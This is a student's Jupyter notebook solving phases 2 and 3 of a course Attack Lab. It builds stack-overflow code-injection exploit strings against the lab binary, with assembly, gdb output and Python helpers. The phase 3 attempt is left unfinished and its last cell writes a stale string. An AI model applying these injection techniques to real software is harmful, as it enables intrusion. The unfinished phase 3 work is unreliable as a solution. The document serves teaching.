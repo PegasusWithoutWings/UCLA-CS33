{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# CS33: Attack Lab"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Phase 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Overview"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The key technique of exploitation in phase 2 is code injection, which can be carried out in two steps. First, we will write the binary code instructions into the runtime stack. Then, by overflowing the runtime stack, we overwrite the the return address of the current stack and change it into the starting address of the injected code. This way, when the current procedure call is finished, the program will restart at the overwritten return address, which is the injected code.\n",
    "\n",
    "In this phase, what we want to achieve with the injection code is to call another procedure named `touch2` with cache as the argument. So, in the injected code, we need to first move the desired argument value for `touch2` into `%rdi%`, the register that by convention holds the first argument for procedure call, and then find some way to call the procedure `touch2`. Because the lab requirement forbids us from using `jmp` or `call` in our injected code, we need to use a combination of stack overflow and `ret` to call `touch2`. \n",
    "\n",
    "First, we will place the address of `touch2` in the exploit string. Then, in the injected code, we will manipulate the stack pointer to have it pointing to the injected address of `touch2`. This way, when we call `ret` in the injected code, the stack will pop the address of `touch2` and have the program restart there. as desired."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Execution"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```asm\n",
    "Dump of assembler code for function getbuf:\n",
    "   0x0000000000401847 <+0>:\tsub    $0x28,%rsp\n",
    "   0x000000000040184b <+4>:\tmov    %rsp,%rdi\n",
    "   0x000000000040184e <+7>:\tcallq  0x401a80 <Gets>\n",
    "   0x0000000000401853 <+12>:\tmov    $0x1,%eax\n",
    "   0x0000000000401858 <+17>:\tadd    $0x28,%rsp\n",
    "   0x000000000040185c <+21>:\tretq\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Similar to phase 1, because the stack frame is of size `0x28` or `40`, we need to supply 40-byte long exploit string to overflow the stack and then rewrite the return address with another 8 bytes. However, this time, we also need to include the injected code in the first 40 bytes, so we cannot just simply pad them with 0.\n",
    "\n",
    "To get started, we will write down the assembly code we want to inject. The objective of this phase is to call procedure `touch2` with argument `cookie`, whose value is specified in the file `cookie.txt`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x55ca9f6d\n"
     ]
    }
   ],
   "source": [
    "!cat cookie.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32mmovl\u001b[39;49;00m  \u001b[31m$0x55ca9f6d\u001b[39;49;00m, \u001b[31m%edi\u001b[39;49;00m\n",
      "\u001b[32msub\u001b[39;49;00m   \u001b[31m$0x10\u001b[39;49;00m, \u001b[31m%rsp\u001b[39;49;00m\n",
      "\u001b[32mret\u001b[39;49;00m\n"
     ]
    }
   ],
   "source": [
    "!pygmentize phase2.s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Remark that here we need to subtract the stack pointer by two bytes, `0x10`, to have it point to the 8 byte immediately preceding the return address of the `getbuf` call. Why? Because when the computer is running through our injected code, it has already returned from `getbuf` call, thereby incrementing the stack by `0x8` above the return address of `getbuf`.\n",
    "\n",
    "Then, we need to convert it into byte code. One way to do it is to first assemble it into object code and then use objdump to get the byte code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "!gcc -c phase2.s -o phase2.o"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "!objdump -d phase2.o > phase2.d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "phase2.o:\tfile format Mach-O 64-bit x86-64\n",
      "\n",
      "Disassembly of section __TEXT,__text:\n",
      "__text:\n",
      "       0:\tbf 6d 9f ca 55 \tmovl\t$1439342445, %edi\n",
      "       5:\t48 83 ec 10 \tsubq\t$16, %rsp\n",
      "       9:\tc3 \tretq\n"
     ]
    }
   ],
   "source": [
    "!cat phase2.d"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So the byte representation of the injected code will be:\n",
    "\n",
    "```\n",
    "bf 6d 9f ca 55 48 83 ec 10 c3\n",
    "```\n",
    "\n",
    "Based on the design outlined in the Overview, we will pad the exploit string with 00 until the last 16 bytes; the first 8 bytes will be the address of `touch2` and the second 8 will be the address of the injected code, which is simply the address of the buffer. So, the exploit string will be:\n",
    "\n",
    "```\n",
    "bf 6d 9f ca 55 48 83 ec 10 c3 00 00 00 00 00 00 00 00 00 00 00 00 \n",
    "00 00 00 00 00 00 00 00 00 00 ADDRESS_OF_TOUCH2 ADDRESS_OF_BUFFER\n",
    "```\n",
    "\n",
    "We can find the address of `touch2` by simply examining the disassembled object code, `ctarget.s`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01;31m\u001b[Ktouch2\u001b[m\u001b[K:\n",
      "  401889:\t48 83 ec 08 \tsubq\t$8, %rsp\n",
      "--\n",
      "  40189f:\t74 23 \tje\t35 <\u001b[01;31m\u001b[Ktouch2\u001b[m\u001b[K+0x3B>\n",
      "  4018a1:\tbf 00 31 40 00 \tmovl\t$4206848, %edi\n",
      "--\n",
      "  4018dd:\teb db \tjmp\t-37 <\u001b[01;31m\u001b[Ktouch2\u001b[m\u001b[K+0x31>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "!cat ctarget.s | grep -A 1 touch2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The line immediately after `touch2:` declaration is the address of the procedure. Padded to 8 bytes, the address is `0x0000000000401889`. However, we still need to format the address to fit the Little Endian byte order and separate each byte with a space. I wrote a convenient Python procedure `toLittleEndian` to carry out the task."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "\n",
    "def toLittleEndian(word):\n",
    "    result = '';\n",
    "    for i in range(0, len(word), 2):\n",
    "      result = word[i : i + 2] + ' ' + result\n",
    "    return result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'89 18 40 00 00 00 00 00 '"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "address_of_touch2 = toLittleEndian('0000000000401889')\n",
    "address_of_touch2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Therefore, `ADDRESS_OF_TOUCH2` is `89 18 40 00 00 00 00 00`.\n",
    "\n",
    "The only thing remains is to find the address of the buffer, which cannot be found by just looking into the disassembled code because it is allocated at run time. So, we are going to run the code in `gdb` to find it out. Below is the result of running gdb in the school's designated lab server:\n",
    "\n",
    "```\n",
    "(gdb) break getbuf\n",
    "Breakpoint 1 at 0x401847: file buf.c, line 12.\n",
    "(gdb) run\n",
    "Starting program: /w/home.13/class/classtzh/CS33/AttackLab/target40/ctarget\n",
    "Cookie: 0x55ca9f6d\n",
    "\n",
    "Breakpoint 1, getbuf () at buf.c:12\n",
    "12\tbuf.c: No such file or directory.\n",
    "(gdb) disassemble\n",
    "Dump of assembler code for function getbuf:\n",
    "=> 0x0000000000401847 <+0>:\tsub    $0x28,%rsp\n",
    "   0x000000000040184b <+4>:\tmov    %rsp,%rdi\n",
    "   0x000000000040184e <+7>:\tcallq  0x401a80 <Gets>\n",
    "   0x0000000000401853 <+12>:\tmov    $0x1,%eax\n",
    "   0x0000000000401858 <+17>:\tadd    $0x28,%rsp\n",
    "   0x000000000040185c <+21>:\tretq\n",
    "End of assembler dump.\n",
    "(gdb) stepi\n",
    "14\tin buf.c\n",
    "(gdb) disassemble\n",
    "Dump of assembler code for function getbuf:\n",
    "   0x0000000000401847 <+0>:\tsub    $0x28,%rsp\n",
    "=> 0x000000000040184b <+4>:\tmov    %rsp,%rdi\n",
    "   0x000000000040184e <+7>:\tcallq  0x401a80 <Gets>\n",
    "   0x0000000000401853 <+12>:\tmov    $0x1,%eax\n",
    "   0x0000000000401858 <+17>:\tadd    $0x28,%rsp\n",
    "   0x000000000040185c <+21>:\tretq\n",
    "End of assembler dump.\n",
    "(gdb) print /x $rsp\n",
    "$1 = 0x556647a8\n",
    "```\n",
    "\n",
    "We can see that the address of the buffer is `0x556647a8`, which, padded to 8 byte, is `0x00000000556647a8`. Convert it again to Little Endian with our Python script."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'a8 47 66 55 00 00 00 00 '"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "buffer_address = toLittleEndian('00000000556647a8')\n",
    "buffer_address"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Therefore, ADDRESS_OF_BUFFER is a8 47 66 55 00 00 00 00.\n",
    "\n",
    "Since we now have all the puzzle pieces, we can complete the exploit string, which is:\n",
    "\n",
    "```\n",
    "bf 6d 9f ca 55 48 83 ec 10 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n",
    "00 00 00 00 00 00 00 00 89 18 40 00 00 00 00 00 a8 47 66 55 00 00 00 00\n",
    "```\n",
    "\n",
    "We then tested it on the server. It worked.\n",
    "\n",
    "```\n",
    "# ./hex2raw < phase2.txt | ./ctarget\n",
    "Cookie: 0x55ca9f6d\n",
    "Type string:Touch2!: You called touch2(0x55ca9f6d)\n",
    "Valid solution for level 2 with target ctarget\n",
    "PASS: Sent exploit string to server to be validated.\n",
    "NICE JOB!\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Phase 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This phase, again, is about code injection attack. Unlike Phase 2, for this phase we need to pass a string that matches the cookie as argument to procedure `touch3`.\n",
    "\n",
    "```c\n",
    "/* Compare string to hex represention of unsigned value */\n",
    "int hexmatch(unsigned val, char *sval) {\n",
    "  char cbuf[110];\n",
    "  /* Make position of check string unpredictable */\n",
    "  char *s = cbuf + random() % 100;\n",
    "  sprintf(s, \"%.8x\", val);\n",
    "  return strncmp(sval, s, 9) == 0;\n",
    "}\n",
    "\n",
    "void touch3(char *sval)\n",
    "{\n",
    "    vlevel = 3;       /* Part of validation protocol */\n",
    "    if (hexmatch(cookie, sval)) {\n",
    "        printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval);\n",
    "        validate(3);\n",
    "    } else {\n",
    "        printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval);\n",
    "        fail(3); \n",
    "    }\n",
    "    exit(0); \n",
    "}\n",
    "```\n",
    "\n",
    "The `hexmatch` procedure given to check the string input seems complicated. However, all it is doing is to randomize its buffer's location on the stack it stores the `val` into, so that we cannot pass the check by simply guessing the location of the buffer and writing into it by overflwoing the stack. As long as we pass the `cookie` value in the format of byte string into `hexmatch`, we will be able to pass the check.\n",
    "\n",
    "So first, we need the byte string representation of `cookie`, `55ca9f6d`. We "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'35 35 63 61 39 66 36 64 00'"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cookie = '55ca9f6d'\n",
    "def build_cookie_str(cookie):\n",
    "    return ''.join([hex(ord(char))[2:] + ' ' for char in cookie]) + '00'\n",
    "cookie_str = build_cookie_str(cookie)\n",
    "cookie_str"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Note that we need to add a null character to the string to indicate its ending.\n",
    "\n",
    "Now we have the cookie representation at hand, we will proceed to layout what we need to inject on the stack. \n",
    "\n",
    "```\n",
    "ADDRESS_OF_TOUCH3\n",
    "OVERWRITE_RETURN_ADDRESS\n",
    "PADDING\n",
    "COOKIE_STRING\n",
    "RET (call touch3)\n",
    "SET_RDI_TO_THE_ADDRESS_OF_COOKIE_STRING\n",
    "```\n",
    "\n",
    "What makes this phase tricky is that the two procedures, `hexmatch` and `touch3`, will actually push onto the stack when called. So if we accidentally put our injected code in the locations these two procedures push onto, then our code will be overwritten. To make it safe, we are going to write all our codes as low on the stack frame as possible. The lowest we can get is the `buffer`. So we will just write everything together starting at the location of `buffer`.\n",
    "\n",
    "Here is a prototype of the machine codes we want to inject:\n",
    "\n",
    "```asm\n",
    "movq $ADDRESS_OF_COOKIE_STRING, %rdi\n",
    "ret\n",
    "```\n",
    "\n",
    "In our layout, the cookie string is put right above the injected code on the stack. As a result, in order to get its address, we must first know the exact length of the injected code after assembling. However, the length of the injected code actually depends on the address of cookie string. For example, if we disassemble\n",
    "\n",
    "```asm\n",
    "movq $0x0000000000000000, %rdi\n",
    "ret\n",
    "```\n",
    "\n",
    "the result will be\n",
    "\n",
    "```\n",
    "48 c7 c7 00 00 00 00 \tmovq\t$0, %rdi\n",
    "c3 \tretq\n",
    "```\n",
    "\n",
    "However, if we disassemble\n",
    "\n",
    "```asm\n",
    "movq $0x0123456789abcdef, %rdi\n",
    "ret\n",
    "```\n",
    "\n",
    "the result will be \n",
    "\n",
    "```asm\n",
    "48 bf ef cd ab 89 67 45 23 01 \tmovabsq\t$81985529216486895, %rdi\n",
    "c3 \tretq\n",
    "```\n",
    "\n",
    "The length of the disassembled codes are clearly different. So we need to be very careful what we use as the place holder for the address. Here, we will use the address of the buffer, `0x556647a8`, which will be very close to the actual address, as the place holder."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32mmovq\u001b[39;49;00m \u001b[31m$0x556647a8\u001b[39;49;00m, \u001b[31m%rdi\u001b[39;49;00m\n",
      "\u001b[32mret\u001b[39;49;00m\n"
     ]
    }
   ],
   "source": [
    "!pygmentize phase3_tmp.s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "!gcc -c phase3_tmp.s -o phase3.o"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "!objdump -d phase3.o > phase3.d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "phase3.o:\tfile format Mach-O 64-bit x86-64\n",
      "\n",
      "Disassembly of section __TEXT,__text:\n",
      "__text:\n",
      "       0:\t48 c7 c7 a8 47 66 55 \tmovq\t$1432766376, %rdi\n",
      "       7:\tc3 \tretq\n"
     ]
    }
   ],
   "source": [
    "!cat phase3.d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "8"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len('48 c7 c7 a8 47 66 55 c3'.split())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So the byte representation of the injected code will be of length `8`. Adding `8` to the address of the buffer,"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x556647b0'"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cookie_string_address = hex(0x556647a8 + 8)\n",
    "cookie_string_address"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So the address of the cookie string in out stack layout will be `0x556647b0`. We will then change the address holder in `phase3.s` into `0x556647b0`. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32mmovq\u001b[39;49;00m \u001b[31m$0x556647b0\u001b[39;49;00m, \u001b[31m%rdi\u001b[39;49;00m\n",
      "\u001b[32mret\u001b[39;49;00m\n"
     ]
    }
   ],
   "source": [
    "!pygmentize phase3.s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "phase3.o:\tfile format Mach-O 64-bit x86-64\n",
      "\n",
      "Disassembly of section __TEXT,__text:\n",
      "__text:\n",
      "       0:\t48 c7 c7 b0 47 66 55 \tmovq\t$1432766384, %rdi\n",
      "       7:\tc3 \tretq\n"
     ]
    }
   ],
   "source": [
    "!gcc -c phase3.s -o phase3.o && objdump -d phase3.o > phase3.d && cat phase3.d"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Observe that the length of the instruction does not change. Thus, we now can be certain that the byte code representation of the injected code will be:\n",
    "\n",
    "```\n",
    "48 c7 c7 b0 47 66 55 c3\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "injected_code = '48 c7 c7 b0 47 66 55 c3'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'48 c7 c7 b0 47 66 55 c3 35 35 63 61 39 66 36 64 00'"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "exploit_string_build = injected_code + ' ' + cookie_str\n",
    "exploit_string_build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we need to add the padding to the exploit string. Because the stack frame is of size 40, to start overwriting return address, we need to first make the string of 40 bytes long."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'48 c7 c7 b0 47 66 55 c3 35 35 63 61 39 66 36 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 '"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "exploit_string_build = exploit_string_build + ' ' + (40 - len(exploit_string_build.split())) * '00 '\n",
    "exploit_string_build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we can add the starting address of the injected code, which is the address of the buffer, to the exploit string. It will overwrite the return address."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'48 c7 c7 b0 47 66 55 c3 35 35 63 61 39 66 36 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 47 66 55 00 00 00 00 '"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "exploit_string_build = exploit_string_build + buffer_address\n",
    "exploit_string_build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The last piece of the puzzle will be the address of `touch3`. We can easily find that out by searching through `ctarget.s`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01;31m\u001b[Ktouch3\u001b[m\u001b[K:\n",
      "  40195e:\t53 \tpushq\t%rbx\n",
      "--\n",
      "  40197c:\t74 26 \tje\t38 <\u001b[01;31m\u001b[Ktouch3\u001b[m\u001b[K+0x46>\n",
      "  40197e:\t48 89 de \tmovq\t%rbx, %rsi\n",
      "--\n",
      "  4019c0:\teb d8 \tjmp\t-40 <\u001b[01;31m\u001b[Ktouch3\u001b[m\u001b[K+0x3C>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "!cat ctarget.s | grep -A 1 touch3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So the address of `touch3` is `0x000000000040195e`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'5e 19 40 00 00 00 00 00 '"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "address_of_touch3 = toLittleEndian('000000000040195e')\n",
    "address_of_touch3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Adding it to the existing pieces of exploit string, we shall get the final build."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'48 c7 c7 b0 47 66 55 c3 35 35 63 61 39 66 36 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 47 66 55 00 00 00 00 5e 19 40 00 00 00 00 00'"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "exploit_string_build += address_of_touch3\n",
    "exploit_string_build = exploit_string_build.strip()\n",
    "exploit_string_build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here we sum up how we build the exploit string:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'48 c7 c7 b0 47 66 55 c3 35 35 63 61 39 66 36 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 47 66 55 00 00 00 00 5e 19 40 00 00 00 00 00'"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def build_exploit_string(injected_code, cookie_str, buffer_address, address_of_touch3):\n",
    "    result = injected_code + ' ' + cookie_str\n",
    "    # Add Padding\n",
    "    result += ' ' + (40 - len(result.split())) * '00 '    \n",
    "    result += buffer_address\n",
    "    result += address_of_touch3\n",
    "    result = result.strip()\n",
    "    return result\n",
    "\n",
    "test = build_exploit_string(injected_code, cookie_str, buffer_address, address_of_touch3)\n",
    "test"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test == exploit_string_build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Testing\n",
    "\n",
    "I stored the key into `phase3.txt` and attemped to solve phase 3 with it but failed. There was also a segmentation error. Because the exploit string itself is not long enough to cause the problem, the reason lies somewhere else. It is noted in the lab instruction that \"when functions `hexmatch` and `strncmp` are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf\". It could be a possible explanation. To figure things out, I decided to use `gdb` to step through the programs.\n",
    "\n",
    "Here is a tip that might come handy with `gdb`. We can still use redirect in `gdb` interface. Simply type\n",
    "\n",
    "```bash\n",
    "run < file_to_redirect\n",
    "```\n",
    "\n",
    "However, we cannot run another binary in the interface. So, we need to first generate a text file that can be redirected as the input. (Because `hex2raw` is compiled for SEASNET server and I cannot figure out a way to run Jupyter Notebook there, I will just put the command here in txet)\n",
    "\n",
    "```bash\n",
    "./hex2raw phase3.txt > phase3_raw.txt\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After debugging in GDB, I found that the segmentation fault occured when we are returning from `getbuf`. After further examination, I found that `$rsp` does not hold the addres it should hold. So I looked into `phase3.txt`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "48 c7 c7 b0 47 66 55 c3 35 35 63 61 39 66 36 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 47 66 55 00 00 00 00 5e 19 40 00 00 00 00 00\n"
     ]
    }
   ],
   "source": [
    "!cat phase3.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Somehow when I am copying the address from the cell above into my VIM editor in the terminal, the first two bytes disappeared. I have long been aware that copying into the terminal can lead to unpredictable behavior as the integration is not perfect, but this is the first time I paid the real price.\n",
    "\n",
    "To avoid future incidences like this, I will refrain from any copy/paste into/out of terminal. If unavoidable, I will double check the result. In this case, we can simply write into the text file with Python right in the notebook and avoid such frail behavior."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "file = open(\"phase3.txt\", 'w')\n",
    "file.write(exploit_string_build + '\\n')\n",
    "file.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "48 c7 c7 b0 47 66 55 c3 35 35 63 61 39 66 36 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 47 66 55 00 00 00 00 5e 19 40 00 00 00 00 00\n"
     ]
    }
   ],
   "source": [
    "cat phase3.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We went back to the server and experimented with the new key. Cheers. We solved the segmentation fault. However, we got another problem.\n",
    "\n",
    "```\n",
    "Type string:Misfire: You called touch3(\"55ca9f6d�GfU\")\n",
    "```\n",
    "\n",
    "Apparently the string argument turned out to be not quite what we want it to be. It should be:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'55ca9f6d'"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cookie"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It seems that the string did not terminate at its end. However, I did not forget to include the null character at the end."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'35 35 63 61 39 66 36 64 00'"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cookie_str"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So I could not really figure out what went wrong by just looking at my key. It looks perfectly fine. Again, I need to rely on `gdb` again.\n",
    "\n",
    "I set a breakpoint at `touch3`, and when it is called, I checked its argument with `x/s $rdi`, which prints out the first argument in string format. The result is:\n",
    "\n",
    "```\n",
    "(gdb) x/s $rdi\n",
    "0x556647b0:\t\"55ca9f6d\"\n",
    "```\n",
    "\n",
    "Nothing wrong with it as well. We could only suspect that the argument needs to be `0x55ca9f6d` instead of `55ca9f6d`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'30 78 35 35 63 61 39 66 36 64 00'"
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cookie_str = build_cookie_str('0x55ca9f6d')\n",
    "cookie_str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'48 c7 c7 b0 47 66 55 c3 30 78 35 35 63 61 39 66 36 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 47 66 55 00 00 00 00 5e 19 40 00 00 00 00 00'"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "exploit_string = build_exploit_string(injected_code, cookie_str, buffer_address, address_of_touch3)\n",
    "exploit_string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "file = open(\"phase3.txt\", 'w')\n",
    "file.write(exploit_string_build + '\\n')\n",
    "file.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
